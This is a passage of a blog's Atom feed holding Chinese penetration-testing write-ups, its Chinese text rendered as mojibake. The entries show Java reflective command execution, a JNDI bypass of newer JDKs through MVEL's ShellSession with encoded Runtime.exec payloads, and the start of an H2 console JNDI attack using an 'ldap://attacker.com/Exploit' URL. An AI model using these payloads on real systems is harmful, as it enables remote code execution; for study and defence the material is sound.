        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; map &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Redirect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; redirect &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; dir &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ç¬¬å››ä¸ªå‚æ•°dirä¸èƒ½ä¸ºç©ºï¼Œä¸ºç©ºä¼šå¤±è´¥ï¼Œè¡¨ç¤ºåœ¨å“ªä¸ªè·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; map&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; dir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; redirect&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt; reflectProcess &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;reflectProcess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ReflectPI0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>JNDI Bypass - MVEL</title>
    <link href="https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html"/>
    <id>https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html</id>
    <published>2022-03-20T16:00:00.000Z</published>
    <updated>2022-03-21T06:53:39.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æµ‹è¯•èƒŒæ™¯"><a href="#æµ‹è¯•èƒŒæ™¯" class="headerlink" title="æµ‹è¯•èƒŒæ™¯"></a>æµ‹è¯•èƒŒæ™¯</h2><p>JDNIåˆ©ç”¨mvelç»•è¿‡é«˜ç‰ˆæœ¬javaé™åˆ¶çš„æ—¶å€™ï¼Œä½¿ç”¨<a href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>ç¼–ç å˜å½¢ä¹‹åæ‰§è¡Œå‘½ä»¤å¤±è´¥ã€‚åªèƒ½å¼¹ä¸ªè®¡ç®—å™¨ã€‚<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p><h2 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h2><p>æµ…è“å¸ˆå‚…åœ¨<a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a>ä¸­ç»™å‡ºçš„æ‰§è¡Œæ–¹å¼:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆè¯´ç»“è®ºï¼šæŠŠæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™<code>push</code>æŒ‡ä»¤å»æ‰ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="åŸå› æ¢ç´¢"><a href="#åŸå› æ¢ç´¢" class="headerlink" title="åŸå› æ¢ç´¢"></a>åŸå› æ¢ç´¢</h2><p>å…ˆæŠŠæµ‹è¯•çš„å‘½ä»¤åšä¸€æ¬¡ç¼–ç :<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>ç»è¿‡ç¼–ç ä¹‹åï¼š <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><h3 id="å­˜åœ¨pushçš„æ—¶å€™"><a href="#å­˜åœ¨pushçš„æ—¶å€™" class="headerlink" title="å­˜åœ¨pushçš„æ—¶å€™"></a>å­˜åœ¨pushçš„æ—¶å€™</h3><p>ç»è¿‡ä¸€è·¯çš„è·³è½¬ï¼Œè¿›å…¥åˆ°<code>_exec()</code>å‡½æ•°ï¼Œè°ƒç”¨å †æ ˆå¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">_exec:122, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡½æ•°åœ¨108è¡Œå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œåˆ†å‰²: <code>String[] inTokens = this.inBuffer.append(this.commandBuffer).toString().split(&quot;\\s&quot;);</code>ï¼Œ <code>\s</code>è¡¨ç¤ºç©ºæ ¼ã€tabã€æ¢è¡Œ: <code>&#39; &#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;</code>ç­‰<br><img src="/2022/03/21/jndi-exec-by-mvel/2.png"><br>åˆ†å‰²ä¹‹åï¼Œå¾—åˆ°<code>inTokens</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inTokens <span class="token operator">=</span> <span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>@1355<span class="token punctuation">&#125;</span>  <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">"push"</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"Runtime.getRuntime().exec('bash"</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">"-c"</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">"&#123;echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè·å–<code>inTokens[1:]</code>èµ‹å€¼ç»™<code>passParamters</code>ã€‚ç»§ç»­è·Ÿè¿›åˆ°119è¡Œä»£ç : <code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>ï¼Œè¿›å…¥è°ƒç”¨pushæŒ‡ä»¤çš„å‡½æ•°ï¼Œæ­¤æ—¶çš„å‚æ•°å¦‚ä¸‹ï¼š<br><img src="/2022/03/21/jndi-exec-by-mvel/3.png"><br>åœ¨<code>pushContext.java</code>é‡Œé¢è°ƒç”¨<code>MVEL.eval</code>è§£æMVELè¡¨è¾¾å¼ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹å‡ºæ¥æ‰§è¡Œ<code>MVEL.eval</code>çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯args[0]: <code>Runtime.getRuntime().exec(&#39;bash</code>ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥:<br><img src="/2022/03/21/jndi-exec-by-mvel/4.png"></p><h3 id="å»æ‰pushçš„æ—¶å€™"><a href="#å»æ‰pushçš„æ—¶å€™" class="headerlink" title="å»æ‰pushçš„æ—¶å€™"></a>å»æ‰pushçš„æ—¶å€™</h3><p>å½“æ²¡æœ‰pushçš„æ—¶å€™ï¼Œæ‰§è¡Œåˆ°<code>SHellSession.java</code>ä¼šè·³è½¬åˆ°123è¡Œä»£ç åˆ†æ”¯ï¼Œç„¶åå®ä¾‹åŒ–<code>MVELInterpretedRuntime</code>ä¹‹åè°ƒç”¨<code>parse()</code>å‡½æ•°:<br><img src="/2022/03/21/jndi-exec-by-mvel/5.png"><br>ç»è¿‡ä¸€ç³»åˆ—è§£æåˆ¤æ–­ä¹‹åæœ€ç»ˆè¿›å…¥åˆ°<code>propertyAccessor.class</code>çš„896è¡Œï¼Œè·å–åˆ°<code>Runtime</code>ä¸Šä¸‹æ–‡ä¹‹åè°ƒç”¨ä¼ å…¥çš„å‚æ•°:<br><img src="/2022/03/21/jndi-exec-by-mvel/6.png"><br>å‡½æ•°è°ƒç”¨å †æ ˆ:</p><pre class="line-numbers language-none"><code class="language-none">getMethod:995, PropertyAccessor (org.mvel2)getNormal:181, PropertyAccessor (org.mvel2)get:145, PropertyAccessor (org.mvel2)get:125, PropertyAccessor (org.mvel2)getReducedValue:187, ASTNode (org.mvel2.ast)parseAndExecuteInterpreted:112, MVELInterpretedRuntime (org.mvel2)parse:58, MVELInterpretedRuntime (org.mvel2)_exec:171, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a></li><li><a href="https://ares-x.com/tools/runtime-exec/">RUNTIME.EXEC PAYLOAD ENCODE</a></li><li><a href="https://github.com/JKme/EvilRMI">EvilRMI</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æµ‹è¯•èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#æµ‹è¯•èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•èƒŒæ™¯&quot;&gt;&lt;/a&gt;æµ‹è¯•èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;JDNIåˆ©ç”¨mvelç»•è¿‡é«˜ç‰ˆæœ¬javaé™åˆ¶çš„æ—¶å€™ï¼Œä½¿ç”¨&lt;a href=&quot;https://ares-x.com/tools/runtime-exec/&quot;&gt;runtime exec&lt;/a&gt;ç¼–ç å˜å½¢ä¹‹åæ‰§è¡Œå‘½ä»¤å¤±è´¥ã€‚åªèƒ½å¼¹ä¸ªè®¡ç®—å™¨ã€‚&lt;br&gt;&lt;img src=&quot;/2022/03/21/jndi-exec-by-mvel/1.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;æµ‹è¯•ç»“æœ&quot;&gt;&lt;a href=&quot;#æµ‹è¯•ç»“æœ&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•ç»“æœ&quot;&gt;&lt;/a&gt;æµ‹è¯•ç»“æœ&lt;/h2&gt;&lt;p&gt;æµ…è“å¸ˆå‚…åœ¨&lt;a href=&quot;https://tttang.com/archive/1405/&quot;&gt;æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•&lt;/a&gt;ä¸­ç»™å‡ºçš„æ‰§è¡Œæ–¹å¼:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;tomcat_MVEL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; ref &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.mvel2.sh.ShellSession&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.naming.factory.BeanFactory&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;forceString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;a=exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ref&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…ˆè¯´ç»“è®ºï¼šæŠŠæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™&lt;code&gt;push&lt;/code&gt;æŒ‡ä»¤å»æ‰ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŸå› æ¢ç´¢&quot;&gt;&lt;a href=&quot;#åŸå› æ¢ç´¢&quot; class=&quot;headerlink&quot; title=&quot;åŸå› æ¢ç´¢&quot;&gt;&lt;/a&gt;åŸå› æ¢ç´¢&lt;/h2&gt;&lt;p&gt;å…ˆæŠŠæµ‹è¯•çš„å‘½ä»¤åšä¸€æ¬¡ç¼–ç :&lt;code&gt;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/code&gt;&lt;br&gt;ç»è¿‡ç¼–ç ä¹‹åï¼š &lt;code&gt;bash -c &amp;#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;å­˜åœ¨pushçš„æ—¶å€™&quot;&gt;&lt;a href=&quot;#å­˜åœ¨pushçš„æ—¶å€™&quot; class=&quot;headerlink&quot; title=&quot;å­˜åœ¨pushçš„æ—¶å€™&quot;&gt;&lt;/a&gt;å­˜åœ¨pushçš„æ—¶å€™&lt;/h3&gt;&lt;p&gt;ç»è¿‡ä¸€è·¯çš„è·³è½¬ï¼Œè¿›å…¥åˆ°&lt;code&gt;_exec()&lt;/code&gt;å‡½æ•°ï¼Œè°ƒç”¨å †æ ˆå¦‚ä¸‹:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>ä»Spring Boot H2 Databaseåˆ°GetShell</title>
    <link href="https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html"/>
    <id>https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html</id>
    <published>2022-03-17T16:00:00.000Z</published>
    <updated>2022-03-22T02:06:32.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-åˆ‡å…¥ç‚¹"><a href="#0x1-åˆ‡å…¥ç‚¹" class="headerlink" title="0x1. åˆ‡å…¥ç‚¹"></a>0x1. åˆ‡å…¥ç‚¹</h2><p>åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª<code>/console</code>çš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>å¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨<a href="https://anquan.baidu.com/article/1078">JNDIæ³¨å…¥æ¼æ´</a>.</p><p>è®¾ç½®<code>Driver Class</code>ä¸º<code>javax.naming.InitialContext</code>ï¼Œ<code>JDBC URL</code>ä¸º<code>ldap://attacker.com/Exploit</code>ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>æ ¹æ®<code>/env</code>æ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚</p><blockquote><p>RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º true<br>LDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true</p></blockquote><h2 id="0x2-ç»•è¿‡å’Œåˆ©ç”¨"><a href="#0x2-ç»•è¿‡å’Œåˆ©ç”¨" class="headerlink" title="0x2. ç»•è¿‡å’Œåˆ©ç”¨"></a>0x2. ç»•è¿‡å’Œåˆ©ç”¨</h2><h3 id="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡"><a href="#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡" class="headerlink" title="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡"></a>åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡</h3><p>åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š</p><ul><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li></ul><p>URLDNSçš„æµ‹è¯•ä»£ç 